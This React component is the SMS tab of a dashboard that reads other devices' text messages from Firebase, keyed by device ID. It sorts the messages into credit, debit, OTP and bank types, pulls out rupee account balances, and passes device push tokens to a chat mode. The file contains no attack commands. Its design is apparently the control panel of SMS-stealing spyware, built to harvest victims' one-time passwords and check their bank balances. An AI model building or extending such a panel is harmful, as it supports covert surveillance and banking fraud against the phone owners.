import { useState, useMemo, useRef, useEffect, useCallback } from "react";
import {
  Search, Loader2, MessageSquare, ChevronDown, Copy, Trash2, Eye,
  ArrowDownLeft, ArrowUpRight, Key, Building2, Wallet, Download, ArrowUpDown, MessagesSquare
} from "lucide-react";
import { SMS } from "@/hooks/useFirebaseData";
import { ref, remove } from "@/lib/rtdbPb";
import { db } from "@/lib/firebase";
import { format } from "date-fns";
import { toast } from "sonner";
import { useSecuritySettings } from "@/hooks/useSecuritySettings";
import OtpDialog from "@/components/OtpDialog";
import SmsChatMode from "@/components/SmsChatMode";

interface SmsTabProps {
  deviceId: string;
  smsList: SMS[];
  loading: boolean;
  hasMore: boolean;
  loadMore: () => void;
  loadAll: () => void;
  loadingAll: boolean;
  allLoaded: boolean;
  fcmToken?: string;
  onSearchFocus?: () => void;
  onSearchBlur?: () => void;
  highlightSmsKey?: string;
}

// Use shared parser
import { classifySMS, detectSource, extractBalance } from "@/lib/smsParser";

const smsBadge: Record<string, { label: string; bg: string; text: string; icon: React.ElementType }> = {
  credit: { label: "Credit", bg: "bg-green/10", text: "text-green", icon: ArrowDownLeft },
  debit: { label: "Debit", bg: "bg-destructive/10", text: "text-destructive", icon: ArrowUpRight },
  otp: { label: "OTP", bg: "bg-yellow/10", text: "text-yellow", icon: Key },
  bank: { label: "Bank", bg: "bg-cyan/10", text: "text-cyan", icon: Building2 },
  promo: { label: "Promo", bg: "bg-secondary", text: "text-muted-foreground", icon: MessageSquare },
  other: { label: "Other", bg: "bg-secondary", text: "text-muted-foreground", icon: MessageSquare },
};


const PAGE_SIZE = 100;

const SmsTab = ({ deviceId, smsList, loading, hasMore, loadMore, loadAll, loadingAll, allLoaded, fcmToken, onSearchFocus, onSearchBlur, highlightSmsKey }: SmsTabProps) => {
  const [smsFilter, setSmsFilter] = useState("all");
  const [search, setSearch] = useState("");
  const [showSearch, setShowSearch] = useState(false);
  const [visibleCount, setVisibleCount] = useState(PAGE_SIZE);
  const [otpTarget, setOtpTarget] = useState<SMS | null>(null);
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest");
  const [chatMode, setChatMode] = useState(false);
  const [highlightKey, setHighlightKey] = useState<string | null>(highlightSmsKey || null);
  const { security } = useSecuritySettings();
  const smsRefs = useRef<Record<string, HTMLDivElement | null>>({});

  const classified = useMemo(() =>
    smsList.map((sms) => ({
      ...sms,
      cls: classifySMS(sms.body, sms.sender),
      source: detectSource(sms.body, sms.sender),
      balance: extractBalance(sms.body),
    })),
    [smsList]
  );

  const balanceSummary = useMemo(() => {
    const map: Record<string, { balance: number; date: number; smsKey: string }> = {};
    for (const sms of classified) {
      if (sms.balance !== null && sms.source) {
        const key = sms.source;
        if (!map[key] || sms.date > map[key].date) {
          map[key] = { balance: sms.balance, date: sms.date, smsKey: sms.key };
        }
      }
    }
    return Object.entries(map).sort((a, b) => b[1].balance - a[1].balance);
  }, [classified]);

  const detectedSources = useMemo(() => {
    const set = new Set<string>();
    classified.forEach((s) => { if (s.source) set.add(s.source); });
    return Array.from(set);
  }, [classified]);

  const filtered = useMemo(() => {
    let result = classified;
    if (smsFilter !== "all") result = result.filter((s) => s.cls.type === smsFilter);
    if (search.trim()) {
      const q = search.toLowerCase();
      result = result.filter((s) =>
        s.body.toLowerCase().includes(q) || s.sender.toLowerCase().includes(q) || (s.source || "").toLowerCase().includes(q)
      );
    }
    return [...result].sort((a, b) => sortOrder === "newest" ? b.date - a.date : a.date - b.date);
  }, [classified, smsFilter, search, sortOrder]);

  const displayList = filtered.slice(0, visibleCount);
  const canShowMore = visibleCount < filtered.length;
  const bottomRef = useRef<HTMLDivElement>(null);

  // Scroll to highlighted SMS
  useEffect(() => {
    if (highlightKey && smsRefs.current[highlightKey]) {
      setTimeout(() => {
        smsRefs.current[highlightKey]?.scrollIntoView({ behavior: "smooth", block: "center" });
      }, 300);
      const timer = setTimeout(() => setHighlightKey(null), 3000);
      return () => clearTimeout(timer);
    }
  }, [highlightKey, displayList]);

  // Auto-load on scroll to bottom
  useEffect(() => {
    const el = bottomRef.current;
    if (!el) return;
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          if (visibleCount < filtered.length) {
            setVisibleCount((c) => c + PAGE_SIZE);
          } else if (hasMore && !allLoaded && !loading) {
            loadMore();
          }
        }
      },
      { threshold: 0.1 }
    );
    observer.observe(el);
    return () => observer.disconnect();
  }, [visibleCount, filtered.length, hasMore, allLoaded, loading, loadMore]);

  const handleCopy = (body: string) => {
    navigator.clipboard.writeText(body);
    toast.success("Copied");
  };

  const doDelete = async (sms: SMS) => {
    try {
      await remove(ref(db, `mess/${deviceId}/smss/${sms.key}`));
      toast.success("Deleted");
    } catch { toast.error("Failed to delete"); }
  };

  const handleDelete = (sms: SMS) => {
    if (security.otp_on_delete) {
      setOtpTarget(sms);
    } else {
      doDelete(sms);
    }
  };

  return (
    <div className="space-y-2.5">
      {/* Balance Summary */}
      {balanceSummary.length > 0 && (
        <div className="rounded-2xl border border-border bg-card p-3">
          <div className="flex items-center gap-1.5 mb-2">
            <Wallet className="h-3.5 w-3.5 text-primary" />
            <span className="text-[11px] font-bold text-foreground">Approx Balances</span>
          </div>
          <div className="flex flex-wrap gap-1.5">
            {balanceSummary.map(([source, { balance, smsKey }]) => (
              <button
                key={source}
                onClick={() => {
                  setSmsFilter("all");
                  setSearch("");
                  setVisibleCount(PAGE_SIZE);
                  setHighlightKey(smsKey);
                  // Ensure the SMS is visible
                  const idx = classified.findIndex(s => s.key === smsKey);
                  if (idx >= 0) setVisibleCount(Math.max(PAGE_SIZE, idx + 10));
                }}
                className="inline-flex items-center gap-1 px-2 py-1 rounded-lg bg-secondary border border-border text-[10px] font-mono hover:border-primary/30 hover:bg-primary/5 transition-all cursor-pointer group"
              >
                <span className="text-muted-foreground group-hover:text-foreground transition-colors">{source}</span>
                <span className="font-bold text-green">₹{balance.toLocaleString("en-IN")}</span>
                <Eye className="h-2.5 w-2.5 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity" />
              </button>
            ))}
          </div>
        </div>
      )}

      {detectedSources.length > 0 && balanceSummary.length === 0 && (
        <div className="flex flex-wrap gap-1.5">
          {detectedSources.map((s) => (
            <span key={s} className="px-2 py-0.5 rounded-md bg-secondary border border-border text-[10px] text-muted-foreground">{s}</span>
          ))}
        </div>
      )}

      {/* Search + Load All Row */}
      <div className="flex items-center gap-2">
        {showSearch ? (
          <div className="flex-1 relative">
            <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
            <input
              autoFocus
              value={search}
              onChange={(e) => { setSearch(e.target.value); setVisibleCount(PAGE_SIZE); }}
              onFocus={onSearchFocus}
              onBlur={onSearchBlur}
              placeholder="Search SMS..."
              className="w-full rounded-xl border border-border bg-card pl-8 pr-8 py-2 text-[11px] text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary"
            />
            {search && (
              <button onClick={() => setSearch("")} className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground">
                <span className="text-xs">✕</span>
              </button>
            )}
          </div>
        ) : (
          <button
            onClick={() => setShowSearch(true)}
            className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-card border border-border text-[10px] font-medium text-muted-foreground hover:text-foreground hover:border-primary/30 transition-all"
          >
            <Search className="h-3.5 w-3.5" />
            Search
          </button>
        )}
        {!allLoaded && (
          <button
            onClick={loadAll}
            disabled={loadingAll}
            className="flex items-center gap-1.5 px-3 py-2 rounded-xl bg-primary/10 border border-primary/20 text-[10px] font-bold text-primary hover:bg-primary/20 transition-all whitespace-nowrap"
          >
            {loadingAll ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Download className="h-3.5 w-3.5" />}
            Load All
          </button>
        )}
        {allLoaded && (
          <>
            <span className="text-[10px] text-green font-semibold px-2 py-1 rounded-lg bg-green/10">✓ All loaded</span>
            <button
              onClick={() => setChatMode(c => !c)}
              className={`flex items-center gap-1 px-3 py-2 rounded-xl border text-[10px] font-bold transition-all whitespace-nowrap ${
                chatMode
                  ? "gradient-purple-pink text-primary-foreground border-transparent"
                  : "bg-card border-border text-muted-foreground hover:text-foreground hover:border-primary/30"
              }`}
            >
              <MessagesSquare className="h-3.5 w-3.5" />
              Chat
            </button>
            {!chatMode && (
              <button
                onClick={() => setSortOrder(s => s === "newest" ? "oldest" : "newest")}
                className="flex items-center gap-1 px-3 py-2 rounded-xl bg-card border border-border text-[10px] font-bold text-muted-foreground hover:text-foreground hover:border-primary/30 transition-all whitespace-nowrap"
              >
                <ArrowUpDown className="h-3.5 w-3.5" />
                {sortOrder === "newest" ? "Newest" : "Oldest"}
              </button>
            )}
          </>
        )}
      </div>

      {/* Filter chips */}
      <div className="flex gap-1.5 overflow-x-auto pb-1">
        {["all", "credit", "debit", "otp", "bank"].map((t) => (
          <button
            key={t}
            onClick={() => { setSmsFilter(t); setVisibleCount(PAGE_SIZE); }}
            className={`px-3 py-1.5 rounded-xl text-[10px] font-bold whitespace-nowrap border transition-all ${
              smsFilter === t
                ? "gradient-purple-pink text-primary-foreground border-transparent shadow-sm"
                : "bg-card text-muted-foreground border-border hover:text-foreground hover:border-foreground/20"
            }`}
          >
            {t === "all" ? `All (${classified.length})` : `${t.charAt(0).toUpperCase() + t.slice(1)}`}
          </button>
        ))}
      </div>
      {/* Chat Mode */}
      {chatMode && allLoaded ? (
        <SmsChatMode smsList={smsList} deviceId={deviceId} fcmToken={fcmToken} onSearchFocus={onSearchFocus} onSearchBlur={onSearchBlur} />
      ) : (
      <>

      {search.trim().length > 0 && (
        <p className="text-[10px] text-muted-foreground">Found {filtered.length} results</p>
      )}

      {/* SMS List */}
      {loading && smsList.length === 0 ? (
        <EmptyState icon={Loader2} text="Loading messages..." spin />
      ) : displayList.length === 0 ? (
        <EmptyState icon={MessageSquare} text="No messages found" />
      ) : (
        <>
          {displayList.map((sms) => {
            const badge = smsBadge[sms.cls.type];
            const BadgeIcon = badge.icon;
            return (
              <div
                key={sms.key}
                ref={(el) => { smsRefs.current[sms.key] = el; }}
                className={`rounded-2xl border bg-card p-3.5 transition-all ${
                  highlightKey === sms.key
                    ? "border-primary ring-2 ring-primary/30 animate-[pulse_0.6s_ease-in-out_3]"
                    : "border-border hover:border-primary/20"
                }`}
              >
                <div className="flex items-center justify-between mb-1.5">
                  <div className="flex items-center gap-1.5 flex-wrap">
                    <span className="text-[11px] font-bold text-cyan font-mono">{sms.sender}</span>
                    <span className={`inline-flex items-center gap-0.5 text-[9px] px-1.5 py-0.5 rounded-md font-semibold ${badge.bg} ${badge.text}`}>
                      <BadgeIcon className="h-2.5 w-2.5" />
                      {badge.label}
                      {sms.cls.amount && <span className="font-mono ml-0.5">₹{sms.cls.amount}</span>}
                    </span>
                    {sms.source && (
                      <span className="text-[9px] px-1.5 py-0.5 rounded-md bg-primary/10 text-primary font-semibold">{sms.source}</span>
                    )}
                  </div>
                  <span className="text-[10px] text-muted-foreground whitespace-nowrap ml-2">{format(new Date(sms.date), "MMM dd, HH:mm")}</span>
                </div>
                <p className="text-[11px] text-foreground/85 leading-relaxed mb-1.5">{sms.body}</p>
                {sms.balance !== null && (
                  <p className="text-[10px] text-green font-mono font-semibold mb-1.5">Balance: ₹{sms.balance.toLocaleString("en-IN")}</p>
                )}
                <div className="flex items-center justify-between">
                  <span className="text-[9px] px-1.5 py-0.5 rounded-md bg-secondary/80 text-muted-foreground font-mono">{sms.sim}</span>
                  <div className="flex items-center gap-1.5">
                    <button
                      onClick={() => handleCopy(sms.body)}
                      className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-secondary border border-border text-[10px] font-medium text-muted-foreground hover:text-foreground hover:border-foreground/20 active:scale-95 transition-all"
                    >
                      <Copy className="h-3.5 w-3.5" />
                      Copy
                    </button>
                    <button
                      onClick={() => handleDelete(sms)}
                      className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-destructive/10 border border-destructive/20 text-[10px] font-medium text-destructive hover:bg-destructive/20 active:scale-95 transition-all"
                    >
                      <Trash2 className="h-3.5 w-3.5" />
                    </button>
                  </div>
                </div>
              </div>
            );
          })}

          {/* Infinite scroll sentinel */}
          <div ref={bottomRef} className="h-8 flex items-center justify-center">
            {(canShowMore || (hasMore && !allLoaded)) && (
              <Loader2 className="h-4 w-4 text-muted-foreground animate-spin" />
            )}
          </div>
        </>
      )}
      </>
      )}

      {/* OTP Dialog for SMS delete */}
      {otpTarget && (
        <OtpDialog
          action={`Delete SMS from ${otpTarget.sender}`}
          onVerified={() => { doDelete(otpTarget); setOtpTarget(null); }}
          onCancel={() => setOtpTarget(null)}
        />
      )}
    </div>
  );
};

const EmptyState = ({ icon: Icon, text, spin }: { icon: React.ElementType; text: string; spin?: boolean }) => (
  <div className="flex flex-col items-center justify-center py-20 gap-3">
    <div className="h-12 w-12 rounded-2xl bg-card border border-border flex items-center justify-center">
      <Icon className={`h-5 w-5 text-muted-foreground ${spin ? "animate-spin" : ""}`} />
    </div>
    <p className="text-xs text-muted-foreground">{text}</p>
  </div>
);

export default SmsTab;
